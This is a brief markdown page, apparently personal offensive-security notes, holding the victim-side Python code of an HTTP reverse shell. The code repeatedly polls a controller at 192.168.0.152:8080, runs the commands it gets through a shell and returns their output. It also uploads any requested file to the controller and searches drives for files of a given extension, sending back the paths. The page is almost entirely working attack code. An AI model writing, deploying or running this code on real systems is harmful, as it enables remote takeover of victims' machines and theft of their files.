---
title: Coding a reverse shell that searches files
author: amandaguglieri
draft: false
TableOfContents: true
---

# Coding a reverse shell that searches files


## Client side

To be run in the victim's machine.

```python

import requests
import os
import subprocess
import time

while True:
    req = requests.get('http://192.168.0.152:8080')
    command = req.text
    if 'terminate' in command:
        break
    elif 'grab' in command:
        grab, path = command.split("*")
        if os.path.exists(path):
            url = "http://192.168.0.152:8080/store"
            filer = {'file': open(path, 'rb')}
            r = requests.post(url, files=filer)
        else:
            post_response = requests.post(url='http://192.168.0.152:8080', data='[-] Not able to find the file!'.encode())
    elif 'search' in command: #The Formula is search <path>*.<file extension>  -->for example let's say that we got search C:\\*.pdf
        command = command[7:] #cut off the the first 7 character ,, output would be  C:\\*.pdf
        path, ext = command.split('*')
        lists = '' # here we define a string where we will append our result on it

#os.walk is a function that will naviagate ALL the directoies specified in the provided path and returns three values:-
#1-dirpath is a string contains the path to the directory
#2-dirnames is a list of the names of the subdirectories in  dirpath
#3-files is a list of the files name in dirpath

#Once we got the files list, we check each file (using for loop), if the file extension was matching what we are looking for, then we add the directory path into list string.



        for dirpath, dirname, files in os.walk(path):
           for file in files:
               if file.endswith(ext):
                   lists = lists + '\n' + os.path.join(dirpath, file)
        requests.post(url='http://192.168.0.152:8080', data=lists)
    else:
        CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stdout.read())
        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stderr.read())
    time.sleep(3)


```
